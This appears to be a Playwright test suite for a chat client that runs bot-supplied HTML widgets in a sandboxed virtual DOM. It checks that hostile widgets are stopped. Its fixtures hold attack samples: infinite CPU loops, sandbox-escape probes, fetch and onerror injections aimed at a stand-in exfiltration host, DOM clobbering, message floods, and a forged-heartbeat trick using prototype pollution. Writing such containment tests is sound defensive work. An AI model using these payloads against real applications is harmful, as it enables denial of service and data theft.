import { preparePairing } from "./fixtures/pairing-invite.js";
import { test, expect, type Page } from '@playwright/test';
import { mkdtemp, rm } from 'node:fs/promises';import os from 'node:os';import path from 'node:path';
import { HubServer } from '../../src/hub/server.js';import { widgetBlock } from '../../src/client-protocol/widget.js';
import { selectConversation, showDisconnectedBots, waitForClientOnline } from './fixtures/mobile.js';
test.use({serviceWorkers:'block',trace:'off'});
async function fixture(page:Page,html:string){
 if(process.env.WIDGET_DEBUG){page.on('console',m=>console.log('BROWSER',m.type(),m.text()));page.on('pageerror',e=>console.log('PAGEERROR',e.message));await page.addInitScript(()=>addEventListener('message',e=>{if(e.data?.type?.includes('widget'))console.log('WIDGET MESSAGE',JSON.stringify({type:e.data.type,reason:e.data.reason}))}));}

 const root=await mkdtemp(path.join(os.tmpdir(),'widget-cpu-'));const hub=await HubServer.start({stateDir:root,clientDir:path.resolve('dist')});
 await hub.store.db.run("INSERT INTO bots(id,name,secret_hash) VALUES('alpha','隔离助手','fixture')");const conversation=await hub.store.createConversation('owner',['alpha'],'脚本隔离','cpu');
 await hub.store.publishBotMessage('alpha',{id:'widget_cpu',conversationId:conversation.id,status:'complete',blocks:[widgetBlock({title:'运行隔离验证',summary:'组件停止后仍可阅读的文字摘要。',html})]});
 await page.goto(hub.url);await preparePairing(page, hub); await page.getByRole('button',{name:'配对此设备',exact:true}).click();await hub.auth.approve(await page.getByLabel('配对码',{exact:true}).innerText(),'local-owner');await page.getByLabel('配对码',{exact:true}).waitFor({state:'hidden'});await waitForClientOnline(page);await showDisconnectedBots(page);await selectConversation(page,conversation.title);
 return {hub,conversation,dispose:async()=>{await page.close();await hub.close();await rm(root,{recursive:true,force:true})}};
}
const guest=(page:Page)=>page.frameLocator('.widget-panel > iframe').frameLocator('iframe');
for(const stage of ['initialization','click','microtasks'])test(`${stage} infinite execution cannot block chat and is quarantined across reload`,async({page},info)=>{
 const loop=stage==='microtasks'?'const spin=()=>Promise.resolve().then(spin);spin()':'while(true){}';
 const html=stage==='initialization'?`<p>初始报告</p><script>${loop}</script>`:`<p>初始报告</p><button id="loop">开始持续计算</button><script>document.querySelector('#loop').onclick=()=>{${loop}}</script>`;
 const f=await fixture(page,html);
 try{
  await expect(guest(page).getByText('初始报告')).toBeVisible();
  await page.evaluate(()=>{const state={maxGap:0,at:performance.now(),timer:0};state.timer=window.setInterval(()=>{const now=performance.now();state.maxGap=Math.max(state.maxGap,now-state.at);state.at=now},20);(window as any).cpuReceipt=state});
  if(stage!=='initialization'){await expect(guest(page).locator('#loop')).toHaveAttribute('data-tarobot-node',/\d+/);await guest(page).locator('#loop').click();}
  await page.waitForTimeout(250);
  const start=Date.now();await page.getByLabel('消息',{exact:true}).fill('组件运行中仍可输入');const inputMs=Date.now()-start;
  await page.getByRole('button',{name:'放大交互组件'}).click();await page.getByRole('button',{name:'收起交互组件'}).click();
  await expect(page.getByText('组件运行时间过长，已停止。重新加载后才会再次运行。')).toBeVisible({timeout:8000});
  await expect(page.locator('.widget-panel > iframe')).toHaveCount(0);await expect(page.getByLabel('消息',{exact:true})).toHaveValue('组件运行中仍可输入');
  const maxGap=await page.evaluate(()=>{const state=(window as any).cpuReceipt;clearInterval(state.timer);return state.maxGap});
  await info.attach('cpu-containment',{body:JSON.stringify({stage,inputMs,maxTimerGapMs:maxGap}),contentType:'application/json'});
  expect(inputMs).toBeLessThan(1000);expect(maxGap).toBeLessThan(500);
  await page.reload();await waitForClientOnline(page);await selectConversation(page,f.conversation.title);await expect(page.getByText('组件运行时间过长，已停止。重新加载后才会再次运行。')).toBeVisible();await expect(page.locator('.widget-panel > iframe')).toHaveCount(0);
  await page.getByRole('button',{name:'放大交互组件'}).click();await expect(page.locator('.widget-panel > iframe')).toHaveCount(0);await page.getByRole('button',{name:'收起交互组件'}).click();
  await f.hub.store.publishBotMessage('alpha',{id:'widget_cpu',conversationId:f.conversation.id,status:'complete',blocks:[widgetBlock({title:'运行隔离验证',summary:'修正版',html:'<p>已修复的报告</p>'})]});await expect(guest(page).getByText('已修复的报告')).toBeVisible();
 }finally{await f.dispose()}
});
test('script code can reach only a virtual DOM, and injected handlers never execute on the rendering thread',async({page})=>{
 let requests=0;await page.route('https://widget-exfil.invalid/**',route=>{requests++;return route.abort()});
 const html=`<p id="state">starting</p><button id="test">检查</button><script>
 const real=Function('return this')();document.querySelector('#state').textContent=JSON.stringify({realDocument:typeof real.document,worker:typeof real.Worker,postMessage:typeof real.postMessage,native:typeof real.webkit});
 try{real.fetch('https://widget-exfil.invalid/fetch')}catch{}
 document.querySelector('#test').onclick=()=>{document.querySelector('#state').textContent='virtual handler';document.body.insertAdjacentHTML('beforeend','<img src="https://widget-exfil.invalid/image" onerror="while(true){}">')};
 </script>`;
 const f=await fixture(page,html);try{await expect(guest(page).locator('#state')).toHaveText('{"realDocument":"undefined","worker":"undefined","postMessage":"undefined","native":"undefined"}');await guest(page).getByRole('button',{name:'检查'}).click();await expect(guest(page).locator('#state')).toHaveText('virtual handler');await page.getByLabel('消息',{exact:true}).fill('still available');expect(requests).toBe(0);await expect(guest(page).locator('[onerror]')).toHaveCount(0);}finally{await f.dispose()}
});

// A delayed parent timer is not evidence that its Worker has hung.
test('parent scheduling delay does not quarantine a responsive report',async({page})=>{
 const f=await fixture(page,'<button id="ok">Ready</button><script>document.querySelector("#ok").onclick=()=>document.querySelector("#ok").textContent="Selected"</script>');
 try{await expect(guest(page).locator('#ok')).toHaveAttribute('data-tarobot-node',/\d+/);await page.evaluate(()=>{const end=performance.now()+2400;while(performance.now()<end){}});await guest(page).locator('#ok').click();await expect(guest(page).locator('#ok')).toHaveText('Selected');await expect(page.getByText('组件运行时间过长，已停止。重新加载后才会再次运行。')).toHaveCount(0);}finally{await f.dispose()}
});
for(const method of ['focus','scrollIntoView'])test(`${method} message flood is bounded before crossing threads`,async({page},info)=>{
 const f=await fixture(page,`<button id="target">Ready</button><script>setTimeout(()=>{const node=document.querySelector('#target');while(true)node.${method}()},300)</script>`);
 try{const start=Date.now();await expect(page.getByText('组件内容更新过多，已停止。文字摘要仍可阅读。')).toBeVisible({timeout:8000});await page.getByLabel('消息',{exact:true}).fill('still available');await expect(page.locator('.widget-panel > iframe')).toHaveCount(0);await info.attach('message-budget',{body:JSON.stringify({method,retiredMs:Date.now()-start}),contentType:'application/json'});}finally{await f.dispose()}
});
test('virtual DOM preserves hover, media preferences and native details',async({page})=>{
 const f=await fixture(page,'<div id="hover">Hover</div><p id="tip"></p><p id="media"></p><details><summary>Method</summary><p id="method">Data source</p></details><script>window.setTimeout(()=>document.querySelector("#media").dataset.timer="ready",0);document.querySelector("#hover").onmousemove=()=>document.querySelector("#tip").textContent="Hovered";document.querySelector("#media").textContent=String(window.matchMedia("(prefers-reduced-motion: reduce)").matches)+":"+(window.innerWidth>0)</script>');
 try{await expect(guest(page).locator('#media')).toHaveText('false:true');await expect(guest(page).locator('#media')).toHaveAttribute('data-timer','ready');await guest(page).locator('#hover').hover();await expect(guest(page).locator('#tip')).toHaveText('Hovered');await guest(page).locator('summary').click();await expect(guest(page).locator('#method')).toBeVisible();}finally{await f.dispose()}
});
test('script-free details remain open after a click',async({page})=>{
 const f=await fixture(page,'<p>Conclusion</p><details><summary>Method</summary><p id="method">Data source</p></details>');try{await guest(page).locator('summary').click();await expect(guest(page).locator('#method')).toBeVisible();}finally{await f.dispose()}
});
test('ordinary IDs remain usable without replacing trusted DOM methods or executing attributes',async({page})=>{
 const f=await fixture(page,'<img name="createElement"><p id="title">Title</p><p id="method">Method</p><button id="change">Change</button><script>document.querySelector("#change").onclick=()=>{document.querySelector("#method").textContent="Updated";document.body.insertAdjacentHTML("beforeend",\'<img name="querySelector" onerror="while(true){}">\')}</script>');
 try{await expect(guest(page).locator('#change')).toHaveAttribute('data-tarobot-node',/\d+/);await guest(page).locator('#change').click();await expect(guest(page).locator('#title')).toHaveText('Title');await expect(guest(page).locator('#method')).toHaveText('Updated');await expect(guest(page).locator('[onerror]')).toHaveCount(0);await page.getByLabel('消息',{exact:true}).fill('safe');}finally{await f.dispose()}
});
// The guest learns ping nonces while idle, then never yields and tries to make
// the runtime's own messages read as heartbeats through a shared-prototype toJSON.
test('a forged heartbeat cannot keep a non-yielding loop alive',async({page},info)=>{
 const f=await fixture(page,`<p>初始报告</p><button id="b">b</button><script>
 const real=Function('return this')();let seen=0,seenAt=performance.now(),last;
 real.addEventListener('message',e=>{if(e.data&&e.data.type==='ping'){seen=typeof e.data.nonce==='number'?e.data.nonce:0;last=e.data.nonce;seenAt=performance.now()}});
 setTimeout(()=>{let n;Object.prototype.toJSON=function(){return n===undefined?this:{type:'pong',nonce:n}};const b=document.getElementById('b');let at=0;
  while(true){const now=performance.now();if(now-at>=60){at=now;const guess=seen+Math.floor((now-seenAt)/250);for(let k=guess-4;k<=guess+1;k++){n=k;b.focus()}n=last;b.focus();n=undefined}}},600);
 </script>`);
 try{const start=Date.now();await expect(page.getByText('组件运行时间过长，已停止。重新加载后才会再次运行。')).toBeVisible({timeout:8000});await expect(page.locator('.widget-panel > iframe')).toHaveCount(0);await info.attach('forged-heartbeat',{body:JSON.stringify({stoppedAfterMs:Date.now()-start}),contentType:'application/json'});}finally{await f.dispose()}
});
test('a handler without whitespace before it runs instead of a false CPU stop',async({page})=>{
 const f=await fixture(page,`<p id="state">ready</p><button title="x"onclick="document.getElementById('state').textContent='clicked'">点我</button>`);
 try{await expect(guest(page).getByRole('button',{name:'点我'})).toHaveAttribute('data-tarobot-node',/\d+/);await guest(page).getByRole('button',{name:'点我'}).click();await expect(guest(page).locator('#state')).toHaveText('clicked');
  await page.waitForTimeout(2500);await expect(page.locator('.widget-status')).toHaveCount(0);await expect(page.locator('.widget-panel > iframe')).toHaveCount(1);}finally{await f.dispose()}
});
test('script-free markup the Host accepts renders regardless of element count',async({page})=>{
 const circles=Array.from({length:2100},(_,i)=>`<circle cx="${i%300}" cy="${Math.floor(i/300)*10}" r="2"/>`).join('');
 const f=await fixture(page,`<p id="state">散点图</p><svg viewBox="0 0 300 80">${circles}</svg>`);
 try{await expect(guest(page).locator('#state')).toBeVisible();await expect(guest(page).locator('circle')).toHaveCount(2100);await expect(page.locator('.widget-status')).toHaveCount(0);}finally{await f.dispose()}
});
test('a scripted document near the publication limit survives node annotation',async({page})=>{
 const rows=Array.from({length:548},(_,i)=>`<p>${String(i).padStart(4,'0')} ${'lorem ipsum dolor sit amet '.repeat(8)}</p>`).join('');
 const html=`<p id="state">static</p>${rows}<script>document.getElementById('state').textContent='script ran'</script>`;const bytes=new TextEncoder().encode(html).length;expect(bytes).toBeGreaterThan(120*1024);expect(bytes).toBeLessThanOrEqual(128*1024);
 const f=await fixture(page,html);
 try{await expect(guest(page).locator('#state')).toHaveText('script ran');await expect(page.locator('.widget-status')).toHaveCount(0);}finally{await f.dispose()}
});
test('a scripted document over the element bound keeps static content and is not quarantined',async({page})=>{
 const f=await fixture(page,`<p id="state">静态内容</p>${'<i>·</i>'.repeat(2100)}<script>document.getElementById('state').textContent='script ran'</script>`);
 try{await expect(page.getByText('组件未能完整运行，文字摘要仍可阅读。')).toBeVisible({timeout:8000});await expect(guest(page).locator('#state')).toHaveText('静态内容');
  expect(await page.evaluate(()=>localStorage.getItem('tarobot-widget-quarantine-v1'))).toBeNull();
  await page.reload();await waitForClientOnline(page);await selectConversation(page,f.conversation.title);await expect(guest(page).locator('#state')).toHaveText('静态内容');}finally{await f.dispose()}
});
test('GPU, media codec, font and canvas entry points are absent from the guest Worker',async({page})=>{
 const f=await fixture(page,`<p id="caps">checking</p><script>const real=Function('return this')();
 document.getElementById('caps').textContent=JSON.stringify(Object.fromEntries([...['VideoEncoder','AudioEncoder','ImageDecoder','VideoDecoder','FontFace','fonts','OffscreenCanvas','createImageBitmap'].map(name=>[name,typeof real[name]]),['gpu',typeof real.navigator.gpu],['ml',typeof real.navigator.ml]]))</script>`);
 try{await expect(guest(page).locator('#caps')).not.toHaveText('checking');const caps=JSON.parse(await guest(page).locator('#caps').innerText());for(const [name,type] of Object.entries(caps))expect([name,type]).toEqual([name,'undefined']);}finally{await f.dispose()}
});
